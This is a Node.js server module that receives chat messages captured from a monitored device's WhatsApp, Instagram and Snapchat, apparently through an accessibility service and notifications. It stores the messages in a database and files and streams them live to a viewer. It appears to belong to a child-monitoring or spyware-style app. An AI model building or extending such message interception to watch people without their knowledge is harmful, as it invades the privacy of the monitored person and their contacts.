'use strict';

const fs = require('fs');
const path = require('path');
const { resolveChatAppKey, isBadChatConversation, isBadChatText } = require('../utils/validators');
const { escapeHtml } = require('../utils/helpers');
const dbService = require('./database.service');
const constants = require('../config/constants');

function normalizeChatMessage(msg) {
    if (!msg || typeof msg !== 'object') return msg;
    return {
        ...msg,
        packageName: msg.packageName || msg.package || (
            (msg.app || '').toLowerCase().includes('instagram') ? 'com.instagram.android' :
                (msg.app || '').toLowerCase().includes('snap') ? 'com.snapchat.android' :
                    (msg.app || '').toLowerCase().includes('whatsapp') ? 'com.whatsapp' :
                        ''
        ),
        conversation: msg.conversation || msg.contact || msg.chat_with || msg.title || 'Unknown',
        conversationId: msg.conversationId || msg.conversation || msg.contact || msg.chat_with || msg.title || '',
        contactName: msg.contactName || msg.conversation || msg.contact || msg.chat_with || msg.title || '',
        text: msg.text || msg.message || msg.body || '',
        sender: msg.sender || ((msg.direction || '').toString().toUpperCase().includes('OUT') ? 'You' : (msg.conversation || msg.contact || 'Unknown')),
        direction: msg.direction || 'IN',
        timestamp: msg.timestamp || Date.now(),
        clientTimestamp: msg.clientTimestamp || msg.timestamp || Date.now(),
        eventId: msg.eventId || msg.id || ''
    };
}

function groupByApp(messages) {
    const byApp = { whatsapp: [], instagram: [], snapchat: [] };
    for (const msg of messages) {
        const appKey = resolveChatAppKey(msg && msg.packageName);
        if (!appKey || !byApp[appKey]) {
            console.warn('[CHAT_LOG_SKIP_UNKNOWN_APP]', JSON.stringify({ packageName: msg && msg.packageName }));
            continue;
        }
        const rawDirection = String(msg.direction || 'IN').toUpperCase();
        const direction = (rawDirection === 'OUT' || rawDirection === 'OUTGOING' || rawDirection === 'SENT') ? 'OUT' : 'IN';
        const conversation = String(msg.conversation || '').trim();
        const body = String(msg.text || msg.message || '').trim();
        if (!conversation || conversation.toLowerCase() === 'you') {
            console.warn('[CHAT_LOG_SKIP_CONTACT]', JSON.stringify({ app: appKey, direction, conversation, text: body.slice(0, 120) }));
            continue;
        }
        byApp[appKey].push({
            packageName: msg.packageName || '',
            conversation,
            conversationId: String(msg.conversationId || conversation),
            contactName: String(msg.contactName || conversation),
            sender: direction === 'OUT' ? 'You' : (msg.sender || conversation),
            text: body,
            timestamp: Number(msg.timestamp) || Date.now(),
            clientTimestamp: Number(msg.clientTimestamp || msg.timestamp) || Date.now(),
            eventId: String(msg.eventId || msg.id || ''),
            messageType: msg.messageType || 'TEXT',
            direction,
            source: msg.source || 'accessibility'
        });
    }
    return byApp;
}

async function processChatBatch(id, messages, UPLOADS_DIR, io) {
    const normalized = messages
        .map(normalizeChatMessage)
        .filter(m => m && (m.text || m.message))
        .filter(m => !isBadChatConversation(m.conversation) && !isBadChatText(m.text || m.message));

    const byApp = groupByApp(normalized);
    const changedApps = [];
    let mongoFailureCount = 0;
    let mongoSavedCount = 0;

    for (const appKey of Object.keys(byApp)) {
        const list = byApp[appKey];
        if (!list.length) continue;
        try {
            const n = await dbService.saveChatMessages(id, appKey, list);
            mongoSavedCount += Number(n) || 0;
            console.log('[CHAT_LOG_MONGO_RESULT]', JSON.stringify({ childId: id, app: appKey, received: list.length, saved: n }));
            // File mirror
            try {
                const chatsDir = path.join(UPLOADS_DIR, 'chats', id);
                if (!fs.existsSync(chatsDir)) fs.mkdirSync(chatsDir, { recursive: true });
                const chatPath = path.join(chatsDir, `${appKey}.json`);
                let existing = [];
                try { if (fs.existsSync(chatPath)) existing = JSON.parse(await fs.promises.readFile(chatPath, 'utf8')); } catch (e) { existing = []; }
                for (const safeMsg of list) {
                    const duplicate = existing.some(item => item.conversation === safeMsg.conversation && item.text === safeMsg.text && Math.abs((item.timestamp || 0) - safeMsg.timestamp) < 5000);
                    if (!duplicate) existing.unshift(safeMsg);
                }
                await fs.promises.writeFile(chatPath, JSON.stringify(existing.slice(0, 5000)));
            } catch (fe) { console.warn('[chat_logs] file mirror', fe.message); }
            changedApps.push(appKey);
        } catch (e) {
            mongoFailureCount++;
            console.error('[CHAT_LOG_MONGO_ERROR]', JSON.stringify({ childId: id, app: appKey, error: e && e.message }));
        }
    }

    changedApps.forEach(appKey => {
        const latest = byApp[appKey][byApp[appKey].length - 1] || byApp[appKey][0];
        const update = {
            device_id: id, app: appKey,
            contact: latest && latest.conversation,
            contactName: latest && latest.contactName,
            conversation: latest && latest.conversation,
            chat_with: latest && latest.conversation,
            text: latest && latest.text,
            message: latest && latest.text,
            timestamp: latest && latest.timestamp,
            direction: latest && latest.direction,
            sender: latest && latest.sender,
            eventId: latest && latest.eventId
        };
        try { io.to(id).emit('chat_update', update); } catch (e) { }
    });

    return { normalized, changedApps, mongoFailureCount, mongoSavedCount };
}

async function processSocketChatBatch(id, messages, UPLOADS_DIR, io) {
    const chatsDir = path.join(UPLOADS_DIR, 'chats', id);
    if (!fs.existsSync(chatsDir)) fs.mkdirSync(chatsDir, { recursive: true });

    const mongoMessagesByApp = { whatsapp: [], instagram: [], snapchat: [] };

    messages.forEach(msg => {
        const appKey = resolveChatAppKey(msg.packageName) || 'unknown';
        if (appKey === 'unknown') return;
        const rawDirection = String(msg.direction || 'IN').toUpperCase();
        const direction = (rawDirection === 'OUT' || rawDirection === 'OUTGOING' || rawDirection === 'SENT') ? 'OUT' : 'IN';
        const rawConversation = String(msg.conversation || msg.contact || msg.title || '').trim();
        const rawText = String(msg.text || msg.message || msg.body || '').trim();
        if (!rawConversation || !rawText) return;
        mongoMessagesByApp[appKey].push({
            packageName: msg.packageName || '',
            conversation: rawConversation,
            conversationId: String(msg.conversationId || rawConversation),
            contactName: String(msg.contactName || rawConversation),
            sender: direction === 'OUT' ? 'You' : (msg.sender || rawConversation),
            text: rawText,
            timestamp: Number(msg.timestamp) || Date.now(),
            clientTimestamp: Number(msg.clientTimestamp || msg.timestamp) || Date.now(),
            eventId: String(msg.eventId || msg.id || ''),
            messageType: msg.messageType || 'TEXT',
            direction,
            source: msg.source || 'socket'
        });
        const filePath = path.join(chatsDir, `${appKey}.json`);
        let existing = [];
        try {
            if (fs.existsSync(filePath)) existing = JSON.parse(fs.readFileSync(filePath, 'utf8'));
        } catch (e) { existing = []; }

        const safeMsg = {
            id: msg.id || `${Date.now()}_${Math.random().toString(36).substr(2, 6)}`,
            deviceId: id,
            packageName: msg.packageName || '',
            conversation: escapeHtml(msg.conversation || 'Unknown'),
            sender: escapeHtml(msg.sender || 'Unknown'),
            text: escapeHtml(msg.text || ''),
            timestamp: msg.timestamp || Date.now(),
            messageType: msg.messageType || 'TEXT',
            direction: msg.direction || 'IN',
            group: msg.group || false,
            source: msg.source || 'notification'
        };

        const isDup = existing.some(e => e.conversation === safeMsg.conversation && e.text === safeMsg.text && Math.abs(e.timestamp - safeMsg.timestamp) < 5000);
        if (!isDup) {
            existing.unshift(safeMsg);
            existing = existing.slice(0, 5000);
            fs.writeFileSync(filePath, JSON.stringify(existing, null, 2));
        }
    });

    for (const [appKey, list] of Object.entries(mongoMessagesByApp)) {
        if (list.length) {
            try { await dbService.saveChatMessages(id, appKey, list); }
            catch (e) { console.error('[chat_batch] mongo', appKey, e.message); }
        }
    }

    for (const [appKey, list] of Object.entries(mongoMessagesByApp)) {
        for (const msg of list) {
            try {
                io.to(id).emit('chat_update', {
                    device_id: id, app: appKey,
                    contact: msg.conversation, contactName: msg.contactName,
                    conversation: msg.conversation, chat_with: msg.conversation,
                    text: msg.text, message: msg.text,
                    timestamp: msg.timestamp, direction: msg.direction,
                    sender: msg.sender, eventId: msg.eventId
                });
            } catch (e) {
                console.error('[CHAT_REALTIME_ERROR]', appKey, e && e.message);
            }
        }
    }
    console.log(`Chat batch received: ${messages.length} msgs from ${id}`);
}

module.exports = {
    normalizeChatMessage,
    groupByApp,
    processChatBatch,
    processSocketChatBatch
};
